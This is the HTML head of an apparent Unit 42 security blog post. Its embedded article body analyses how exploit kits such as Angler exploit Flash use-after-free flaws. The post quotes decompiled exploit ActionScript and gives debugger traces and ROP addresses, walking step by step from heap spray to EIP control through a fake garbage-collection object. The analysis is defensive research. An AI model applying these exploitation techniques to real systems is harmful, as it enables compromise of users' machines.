
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>The Latest Flash UAF Vulnerabilities in Exploit Kits</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/the-latest-flash-uaf-vulnerabilities-in-exploit-kits/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Unit 42 analyzes the latest Flash UAF vulnerabilities in exploit kits."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/the-latest-flash-uaf-vulnerabilities-in-exploit-kits/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="The Latest Flash UAF Vulnerabilities in Exploit Kits" />
<meta property="og:description" content="Unit 42 analyzes the latest Flash UAF vulnerabilities in exploit kits." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/the-latest-flash-uaf-vulnerabilities-in-exploit-kits/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Adobe Flash" />
<meta property="article:tag" content="ByteArray" />
<meta property="article:tag" content="Flash UAF" />
<meta property="article:tag" content="vulnerabilities" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2015-05-28T13:00:21+00:00" />
<meta property="og:image" content="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/UAF_1-500x192.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 analyzes the latest Flash UAF vulnerabilities in exploit kits." />
<meta name="twitter:title" content="The Latest Flash UAF Vulnerabilities in Exploit Kits" />
<meta name="twitter:image" content="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/UAF_1-500x192.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; The Latest Flash UAF Vulnerabilities in Exploit Kits Comments Feed" href="https://unit42.paloaltonetworks.com/the-latest-flash-uaf-vulnerabilities-in-exploit-kits/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="11"/>
<meta property="og:views" content="10,862"/>
<meta property="og:date_created" content="May 28, 2015 at 6:00 AM"/>
<meta property="og:post_length" content="3017"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Prevention"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware-2/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-prevention-2/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Tao Yan"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tao-yan/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"The Latest Flash UAF Vulnerabilities in Exploit Kits","name":"The Latest Flash UAF Vulnerabilities in Exploit Kits","description":"Introduction Recently, several popular exploit kits, including Angler, Flash EK, SweetOrange, Fiesta andNeutrino[1], have included several use-after-free (UAF) vulnerabilities in Adobe Flash to exploit victims\u2019 browsers. Previously, these exploit kits typically used out-of-bounds access (OBA) vulnerabilities in Adobe Flash, as these types of vulnerabilities can be exploited universally and stably [2], and require less effort...","url":"https:\/\/unit42.paloaltonetworks.com\/the-latest-flash-uaf-vulnerabilities-in-exploit-kits\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/the-latest-flash-uaf-vulnerabilities-in-exploit-kits\/","datePublished":"May 28, 2015","articleBody":"Introduction\nRecently, several popular exploit kits, including Angler, Flash EK, SweetOrange, Fiesta andNeutrino[1], have included several use-after-free (UAF) vulnerabilities in Adobe Flash to exploit victims\u2019 browsers. Previously, these exploit kits typically used out-of-bounds access (OBA) vulnerabilities in Adobe Flash, as these types of vulnerabilities can be exploited universally and stably [2], and require less effort to exploit compared to UAF vulnerabilities. In order to detect these newly added UAF vulnerabilities, we analyzed the code found in the exploit kits to determine which vulnerabilities are present and how they are exploited.\nObfuscation in exploit kits\nTo determine the vulnerabilities within each exploit kit, we first had to overcoming the various obfuscation methods present in the JavaScript. Each exploit kit employs a different set of obfuscation methods, as seen in Figures 1, 2 and 3; however, the main JavaScript obfuscation methods seen in these kits are JavaScript function hooks, variable substitution and no operation (NOP) insertion. The most common obfuscation method seen in these exploits scripts is variable substitution, in which the JavaScript will use regex, math, concat, split, replace and other functions to manipulate and construct values that the script assigns to variables. The analysis of the exploit kits and details on the obfuscation methods used by specific exploit kits are beyond the scope of this report.\n\n\nFigure 1.\u00a0Angler's JavaScript Obfuscation\n\nFigure 2.\u00a0SweetOrange's JavaScript Obfuscation\n\nFigure 3.\u00a0Fiesta's JavaScript Obfuscation\nThe exploit kits also use obfuscation methods within the ActionScript code inside the Flash SWF files loaded by the malicious JavaScript. Similar to the exploit kit\u2019s JavaScript, the obfuscation methods found in the ActionScript also include variable substitution and NOP insertion, which requires deobfuscation and increases the effort required to decompile and analyze the ActionScript. Further obfuscation methods used in the SWF files, which is almost universal amongst the different exploit kits, involves packing the SWF in several layers by using the \u201cLoader::loadbytes()\u201d function. As shown in the Figures 4 and 5, the layers of obfuscation just add complexity and increase the level effort required to analyze the vulnerability, as the most internal layer is always the exploit layer.\n\n\nFigure 4.\u00a0Angler's SWF Obfuscation, Layer 1\n\nFigure 5.\u00a0Angler's SWF Obfuscation, Layer 2\n\nVulnerability analysis\nOnce the JavaScript and ActionScript are deobfuscated, we can locate the specific vulnerabilities and determine how they are exploited. The use-after-free vulnerabilities involved in these popular exploit kits are CVE-2015-0311, CVE-2015-0313 and CVE-2015-0359, which we discuss elsewhere in this report. We found that these three CVEs discuss vulnerabilities in the same ApplicationDomain class. Every ActionScript class has an application domain, usually held by LoaderContext, to define its security context, especially when loading an external SWF by using Loader::load() or Loader::loadbytes(). Figure 6 shows the ApplicationDomain definition in Adobe\u2019s documentation.\n\n\nFigure 6.\u00a0Adobe's definition of ApplicationDomain\nThe ApplicationDomain class has a property, domainMemory, which can be set to a ByteArray Object. The domainMemory ByteArray Object can be shared by other threads or used by other methods or classes. The use-after-free vulnerability arises because the ApplicationDomain relies on notifications to synchronize objects, whereas the other thread or class\/method does not send a message when they free the ByteArray. The ByteArray that was free is still referenced by the ApplicationDomain because it was not notified that the ByteArray was freed. For instance, ByteArray::compress and ByteArray::decompress do not notify the ApplicationDomain when they free a ByteArray due to an IOError, or when a worker thread does not notify the main thread when it frees a ByteArray, which both cause the use-after-free situation.\n\nDuring our analysis, we found that the Angler exploit kit not only forgot to obfuscate its exploit layer within the ActionScript found within the malicious SWF file, but also used helpful variable and function names that made it very easy to understand. Due to its straightforward nature, we will use Angler\u2019s SWF as an example to show a step-by-step process to describe how it exploits the CVE-2015-0313 vulnerability.\n\nIn the first stage, the ActionScript performs heap layout work, sets a byteArray buffer named \u201cattacking_buffer\u201d to \u201cApplicationDomain.currentDomain.domainMemory\u201d, and sends a message to trigger the worker thread. Figure 7 shows the ActionScript within Angler\u2019s malicious SWF file.\n      private function exploit_primordial_start(param1:String) : Boolean\n      {\n         if(!this.check_environment())\n         {\n            return false;\n         }\n         var _loc2_:String = this.DecryptX86URL(param1);\n         this.shellcodes = new Shellcodes(_loc2_,this.xkey.toString());\n         this.prepare_attack();\n         this.make_spray_by_buffers_no_holes();\n         ApplicationDomain.currentDomain.domainMemory = this.attacking_buffer;\n         this.main_to_worker.send(this.message_hello);\n         return true;\n      }\n\nFigure 7.\u00a0Angler's ActionScript that Assigns a Buffer to domainMemory to Begin the Exploitation Process\nThe following displays the memory map for the pertinent objects after the first stage, specifically showing domainMemory and ByteArray having a pointer (yellow) to the ByteArrayData buffer (actually the ByteArrayData was set to domainMemory):\n\nApplicationDomain\n05591c60 10bb6558 80025f01 05555f98 03e831f0\n05591c70 03ea5040 039f3080 03b672b8 03b661e8\n+0x00: vtable of ApplicationDomain\n+0x10: pointer to domainMemory\n\ndomainMemory\n03ea5040 10c99fc8 03b4c190 0577f6d0 039f3080\n03ea5050 03ea6020 05069000 00002000 03a36ea0\n03ea5060 00000003 03ea5040 039f1070 039f1040\n03ea5070 00000000 00000000\n+0x00: vtable of domainMemory\n+0x14: pointer to ByteArrayData\n\nByteArray\n03a4f578 10c890a8 00000002 05069000 00002000\n03a4f588 00002000 00000000\n0x00: vtable of ByteArray\n0x08: pointer to ByteArrayData\n\nByteArrayData\n05069000 33333333 33333333 33333333 33333333\n05069010 33333333 33333333 33333333 33333333\n05069020 33333333 33333333 33333333 33333333\n05069030 33333333 33333333 33333333 33333333\n05069040 33333333 33333333 33333333 33333333\n05069050 33333333 33333333 33333333 33333333\n\nIn the second stage, the worker thread receives the message and clears the \u201cattacking_buffer\u201d ByteArray assigned to \u201cApplicationDomain.currentDomain.domainMemory\u201d in the first phase. However, the script does not notify the ApplicationDomain that the \u201cattacking_buffer\u201d was cleared, which causes \u201cApplicationDomain.currentDomain.domainMemory\u201d to retain a pointer to the ByteArrayData. The lack of notification in the event of clearing the ByteArray causes the UAF vulnerability. Figure 8 shows the ActionScript within Angler\u2019s malicious SWF file that clears the buffer without notifying the ApplicationDomain.\n      protected function on_main_to_worker(param1:Event) : void\n      {\n         var _loc3_:uint = 0;\n         var _loc4_:ByteArray = null;\n         var _loc5_:ByteArray = null;\n         var _loc2_:* = this.main_to_worker.receive();\n         if(_loc2_ == this.message_hello)\n         {\n            _loc3_ = this.page_size;\n            _loc4_ = new ByteArray();\n            _loc4_.length = _loc3_;\n            _loc5_ = new ByteArray();\n            _loc5_.length = _loc3_;\n            _loc5_.clear();\n            this.attacking_buffer.clear();\n            _loc4_.clear();\n            this.protecting_buffer.length = this.protecting_buffer_size;\n            this.fill_buffer(this.protecting_buffer,this.protecting_buffer_filler);\n            Worker.current.setSharedProperty(this.protecting_buffer_name,this.protecting_buffer);\n            this.worker_to_main.send(this.message_world);\n         }\n      }\n\n\u00a0Figure 8.\u00a0Angler's ActionScript that Clears the Buffer Without Notifying the ApplicationDomain\nThe following shows a memory map of the objects after the second stage, showing the ByteArray being cleared and the buffer of ByteArrayData being freed, but the domainMemory retaining the pointer (yellow) to the ByteArrayData buffer:\n\ndomainMemory\n03ea5040 10c99fc8 03b4c190 0577f6d0 039f3080\n03ea5050 03ea6020 05069000 00002000 03a36ea0\n03ea5060 00000003 03ea5040 039f1070 039f1040\n03ea5070 00000000 00000000\n+0x00: vtable of domainMemory\n+0x14: pointer to ByteArrayData\n\nByteArray\n03a4f578 10c890a8 00000001 00000000 00000000\n03a4f588 00000000 00000000\n\nByteArrayData\n05069000 00000000 00000000 00000000 00000000\nExploit Analysis\nAfter triggering the UAF vulnerability, the third stage begins the exploitation process. This is a rather special and unique UAF vulnerability, as the ByteArray object can be any size, which allows exploiters to create and free an arbitrary sized heap block, fill it with an arbitrary sized object (the simplest method is filling the freed heap block with the vector object), and modify the arbitrary offset of this freed buffer to an arbitrary value. he freed buffer is still considered a ByteArray buffer of domainMemory, allowing the exploiter to read and write directly to the ByteArray buffer using alchemy opcodes. For example, the alchemy opcodes \u2018op_li32\u2019 and \u2018op_si32\u2019 can read and write 32-bits memory of the ByteArray buffer of domainMemory.\n\nThe exploitation process continues by taking over the freed ByteArrayData heap block and replacing it with a vector of the same size. Angler\u2019s exploit code, seen in Figure 9, takes over the ByteArrayData buffer in the function \u201cmake_filling_by_uints\u201d and changes the vector length to a very large size by using the alchemy opcodes \u2018op_si32\u2019 in the function \u201cmagic_write_uint\u201d.\n      private function take_over_buffer() : Boolean\n      {\n         var _loc1_:uint = this.magic_read_uint(0);\n         if(_loc1_ != this.protecting_buffer_filler)\n         {\n            return false;\n         }\n         this.make_spray_by_buffers_make_holes();\n         this.make_filling_by_uints();\n         _loc1_ = this.magic_read_uint(0);\n         if(_loc1_ == this.protecting_buffer_filler)\n         {\n            return false;\n         }\n         return true;\n      }\n\n      private function attack() : Boolean\n      {\n         var _loc1_:uint = 0;\n         var _loc2_:uint = 0;\n         var _loc3_:uint = this.byte_array_size;\n         while(_loc2_ &lt; _loc3_)\n         {\n            _loc1_ = this.magic_read_uint(_loc2_);\n            if(_loc1_ == this.vector_elements)\n            {\n               _loc1_ = this.magic_read_uint(_loc2_ + (this.x86_url_checked &lt;&lt; 3));\n               if(_loc1_ == this.vector_signature_0)\n               {  \/\/unchained_elements = 1073741824 = 0x40000000\n                  this.magic_write_uint(_loc2_,this.unchained_elements); \n                  return true;\n               }\n            }\n            _loc2_ = _loc2_ + (this.x86_url_checked &lt;&lt; 2);\n         }\n         return false;\n      }\n\n\u00a0Figure 9.\u00a0Angler's Exploit Code Taking Over ByteArrayData Buffer and Changing its Size\nFigure 10 is a memory map of relevant objects after the third stage. The freed ByteArrayData buffer starting at 0x05069000 (yellow) has been taken over by the VectorData buffer that starts at 0x05069020 (green) and has a size of 0x72. The memory map also shows that the length of VectorData has been set to 0x40000000 (red).\n\ndomainMemory\n03ea5040 10c99fc8 03b4c190 0577f6d0 039f3080\n03ea5050 03ea6020 05069000 00002000 03a36ea0\n03ea5060 00000003 03ea5040 039f1070 039f1040\n03ea5070 00000000 00000000\n+0x00: vtable of domainMemory\n+0x14: pointer to ByteArrayData\n\nVector&lt;uint&gt;\n05661538 10c99918 00000003 0555c1f0 03a44d78\n05661548 0555f150 00000000 05069020 00000000\n05661558 00000000 00000000\n0x00: vtable of Vector&lt;uint&gt;\n0x18: VectorData\n\nOverlapped ByteArrayData[freed, +0x00 begin] and VectorData[taken over, +0x20 begin]\n05069000 00000000 00000000 0506a000 05066000\n05069010 01f80008 00000000 00000000 10f69b44\n05069020 40000000 0506bc00 feedbabe 00001590\n05069030 babeface 00000000 00000000 00000000\n05069040 00000000 00000000 00000000 00000000\n\n\u2026\n\n050691e0 00000000 00000000 00000000 00000000\n050691f0 bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb\n05069200 bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb\n05069210 bbbbbbbb bbbbbbbb 00000072 03b3b000\n05069220 feedbabe 00001591 babeface 00000000\n05069230 00000000 00000000 00000000 00000000\n\n\u2026\n\n05069020+0x00: vector length modified to 0x40000000 by alchemy opcode of domainMemory\n05069020+0x04: GC_object&lt;***important***&gt;\n05069020+0x08: vector[0]\n05069218+0x00: length of the next adjacent vector\nFigure 10.\u00a0Memory Map Showing the ByteArrayData Buffer Taken Over by Vector Buffer\nThe last stage starts by finding the vector with the size of 0x40000000 by comparing the original length to current length. Figure 11 shows a function named \u2018find_unchained_vector\u2019 within the ActionScript that locates the vector, specifically seen in red text. The ActionScript will use this vector to scan memory to find ROP chain, construct and write ROP chain and shellcode (obtained from flashvars) to the VectorData buffer, which is a fairly conventional process. The interesting part of the exploitation process involves the use of the garbage collection (GC) to control the instruction pointer (EIP) instead of the typical usage of a sound or file reference object to control EIP[2]. The exploit code uses the garbage collection (GC) to control EIP by faking a GC_object at offset 0x04 of the VectorData buffer and will overwrite it to the controlled fake_GC_object, which is carried out by a function named \u201ctake_over_32\u201d in Figure 11. According to the memory map in Figure 10, the first element of vector is offset 0x08 (vector[0]), but the ActionScript overwrites the offset 0x04 instead, which is interesting and required additional analysis.\n      private function find_unchained_vector() : Boolean\n      {\n         var _loc1_:Vector.&lt;uint&gt; = null;\n         var _loc2_:* = 0;\n         while(_loc2_ &lt; this.vectors_count)\n         {\n            _loc1_ = this.vectors[_loc2_] as Vector.&lt;uint&gt;;\n            if(!(_loc1_.length == this.vector_elements) &amp;&amp; !(_loc1_.length == this.vector_elements * 2))\n            {\n               this.unchained_vector_index = _loc2_;\n               this.unchained_vector = _loc1_;\n               return true;\n            }\n            _loc2_++;\n         }\n         return false;\n      }\n\n      private function take_over_32() : Boolean\n      {  \/\/unchained_elements = 1073741824 = 0x40000000\n         var _loc1_:uint = this.unchained_elements - 1;\n         this.unchained_vector[_loc1_] = this.fake_object_address;\n         this.unchained_vector.length = this.vector_elements * 2;\n         this.restore_vector_32();\n         return true;\n      }\n\n\u00a0Figure 11.\u00a0Angler's ActionScript Code to Find and Take Over the Vector\nFrom within the ActionScript, we can see it specifically set vector[3fffffff] to fake_gc_object, which Flash will calculate the offset like this in the following manner:\n\nVector[index] -&gt; [VectorData+index*4+8]\nWhen index = 3fffffff\n[VectorData+0x3fffffff*4+8] = [VectorData+0xfffffffc+8] = [VectorData+0x04]\n\nBased on the calculation above, it is obvious that the ActionScript uses an integer overflow to set vector+0x04 offset. After setting the vector+0x04 to the fake_gc_object, it resets the vector length (unchained_vector.length) to release the old vector and triggers garbage collection (GC) to collect this vector. When the garbage collector collects the vector it uses the fake_gc_object, gets an unknown object from this fake_gc_object and peforms a vtable call on this unknown object.\n\nFigure 12 shows the trace route of the garbage collector and the memory map in the last stage to show the process in which exploiters use to control the instruction pointer to execute code. This will not show the entire process of the garbage collector, instead it begins from finding the vector to be collected and ends with the vtable call on the unknown object that provides exploiters control over the EIP.\n1.\tFind vector to be collected, eax is the vector to be collected, and ebp is the fake_gc_object, here it is overwritten to 0x05113c00.\n.text:10664E6D                 mov     ebp, [eax+4] ; eax = vector, 0x05111020\n.text:10664E70                 mov     [esp+24h+var_8], ebp ; ebp = 0x05113c00\n.text:10664E74                 mov     [esp+24h+arg_0], ebx\n.text:10664E78                 cmp     ebx, esi\n.text:10664E7A                 jbe     short loc_10664E82\n.text:10664E7C                 mov     [esp+24h+arg_0], esi\n.text:10664E80                 mov     ebx, esi\n\u2026\n.text:10664FFF loc_10664FFF:\n.text:10664FFF                 push    1               ; int\n.text:10665001                 push    eax             ; int\n.text:10665002                 mov     ecx, ebp        ; int; ecx = 0x05113c00\n.text:10665004                 call    sub_105F0930\n\n2.\tThe sub_105F0930 function  sends the fake_gc_object of vector [0x05113c00] to sub_105F07F0\n.text:105F093E                 mov     esi, ecx\n.text:105F0940                 jge     short loc_105F0949\n.text:105F0942                 add     [esi+eax*4+1DCh], ebx\n\u2026\n.text:105F095C                 mov     ecx, esi        ; int; ecx = 0x05113c00\n.text:105F095E                 call    sub_105F07F0\n...\n3.\tThe sub_105F07F0 function does the collection work and sends fake_gc_object to sub_105F06F0\n.text:105F07F0                 sub     esp, 20h\n.text:105F07F3                 push    esi\n.text:105F07F4                 mov     esi, ecx; esi = 0x05113c00\n.text:105F07F6                 cmp     byte ptr [esi+5], 0\n.text:105F07FA                 jnz     loc_105F08A2\n.text:105F0800                 mov     eax, [esi+1E4h]\n.text:105F0806                 push    0\n.text:105F0808                 push    offset a_gc_collection ; \".gc.CollectionWork\"\n\u2026\n.text:105F0861 loc_105F0861:\n.text:105F0861                 push    1               ; char\n.text:105F0863                 push    1               ; int\n.text:105F0865                 mov     ecx, esi        ; int; ecx = 0x05113c00\n.text:105F0867                 call    sub_105F06F0\n\n4.\tThe sub_105F06F0 function gets an unknown_object from fake_gc_object and sends it to sub_100436E0\n.text:105F06F0                 sub     esp, 20h\n.text:105F06F3                 push    esi\n.text:105F06F4                 mov     esi, ecx ; esi = fake_gc_object = 0x05113c00\n.text:105F06F6                 cmp     byte ptr [esi+5], 0\n.text:105F06FA                 jnz     loc_105F0781\n.text:105F0700                 cmp     dword ptr [esi+2B0h], 0\n.text:105F0707                 jnz     short loc_105F0781\n.text:105F0709                 cmp     byte ptr [esi+2AAh], 0\n.text:105F0710                 jnz     short loc_105F0781\n.text:105F0712                 cmp     byte ptr [esi+7B8h], 0\n.text:105F0719                 jnz     short loc_105F0781\n.text:105F071B                 mov    eax, [esi+1E4h] ; eax = 0x05113d80\n.text:105F0721                 push    edi\n.text:105F0722                 push    0\n.text:105F0724                 push    offset a_gc_collect ; \".gc.Collect\"\n.text:105F0729                 push    eax ; eax = unknown_object = 0x05113d80\n.text:105F072A                 lea     ecx, [esp+34h+var_20]\n.text:105F072E                 call    sub_100436E0\n\n5.\tThe sub_100436E0 function is a wrapper function, as it does nothing more than push the 1st argument and calls the sub_1004295C function\n.text:100436E0                 push    esi\n.text:100436E1                 push    [esp+4+arg_8]\n.text:100436E5                 mov     esi, ecx\n.text:100436E7                 push    [esp+8+arg_4]\n.text:100436EB                 mov     dword ptr [esi], offset off_10B5BEEC\n.text:100436F1                 push   [esp+0Ch+arg_0] ; 1st argument is unknown_object\n.text:100436F5                 call    sub_1004295C\n\n6.\tThe sub_1004295C function performs a vtable call of unknown_object and stack pivot exec at last.\n.text:1004295C                 mov     eax, [esp+arg_4]\n.text:10042960                 push    esi\n.text:10042961                 mov     esi, ecx\n.text:10042963                 mov     ecx, [esp+4+arg_0] ; ecx = unknown_object\n.text:10042967                 mov     [esi+0Ch], eax\n.text:1004296A                 mov     al, [esp+4+arg_8]\n.text:1004296E                 mov     [esi+18h], ecx\n.text:10042971                 mov     [esi+8], al\n.text:10042974                 test    ecx, ecx\n.text:10042976                 jz      short loc_1004298B\n.text:10042978                 cmp     byte ptr [ecx+4], 0\n.text:1004297C                 jz      short loc_1004298B\n.text:1004297E                 mov     eax, [ecx] ; eax is vtable = 0x05114000\n.text:10042980                 call    dword ptr [eax+4] ; jump 0x1015b6be\n\n0:008&gt; u 1015b6be\nFlash32_15_0_0_246+0x15b6be:\n1015b6be 8b01            mov     eax,dword ptr [ecx]\n1015b6c0 51              push    ecx\n1015b6c1 ff5008          call    dword ptr [eax+8] \n\nThis is the first ROP address\n0:008&gt; u 10020740\nFlash32_15_0_0_246+0x20740:\n10020740 94              xchg    eax,esp\n10020741 c3              ret\n\nthe vectorData buffer\n05111000 00000000 00000000 05112000 03c62000\n05111010 01f80008 00000000 00000000 10f69b44\n05111020 40000000 05113c00 feedbabe 000014d0\n05111030 babeface 00000000 00000000 00000000\n05111040 00000000 00000000 00000000 0000000\n\nThe memory used in garbage collector above, 05113c00 is the fake_gc_object\n0:008&gt; dc 05113c00 + 1e4\n05113de4  05113d80 cccccccc cccccccc cccccccc  .=..............\n\nUnknown_object\n05113d80 05114000 00000001 cccccccc cccccccc\n\nFake vtable of Unknown_object, 1015b6be is the 1st executed address, 10020740 is the 2nd executed address, etc\u2026\n05114000 1000b5d2 1015b6be 10020740 1019cc26\n05114010 1028297c 10064fc5 7c809ae1 05114030\n05114020 05114000 00002000 00001000 00000040\n05114030 002ce860 c6610000 89000447 c031fcf4\n\n\u00a0Figure 12.\u00a0Trace of Garbage Collector and Associated Memory Map\nThe use of the garbage collector is a novel method to control EIP, which differs from the previous techniques using sound or file reference objects. It is universal, stable and does not require other objects, as attackers can use the one vector for all the steps required to execute code, including scanning for and finding the ROP chain, overwriting the ROP chain, and control and trigger EIP. This is good news for cybercriminals, as it makes exploit development easier.\nSummary\nThe technique of faking a garbage collection object to control EIP has never been seen before and is worth to paying attention to in future exploits. Due to certain features in Adobe Flash, specifically the ability for alchemy opcodes (such as op_li32\/op_si32) to directly access memory within a ByteArray, use-after-free vulnerabilities are just as easy to exploit as out-of-bounds vulnerabilities. It appears that the authors of exploit kits agree with this, as they continue to add new Flash UAF vulnerabilities to their arsenal. As such, we can anticipate Flash vulnerabilities will continue to be exploited by exploit kits well into the future. Security researchers should not only spend time hunting and reporting more bugs to vendors, but also focus on exploit detection before html5 completely replaces flash altogether.\n\n[1]. http:\/\/malware.dontneedcoffee.com\/\n\n[2]. https:\/\/0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com\/site\/zerodayresearch\/smashing_the_heap_with_vector_Li.pdf\n\n[3]. http:\/\/www.freebuf.com\/news\/special\/61942.html","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"author":[{"@type":"Person","name":"Tao Yan"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"9209","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=9209' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthe-latest-flash-uaf-vulnerabilities-in-exploit-kits%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthe-latest-flash-uaf-vulnerabilities-in-exploit-kits%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
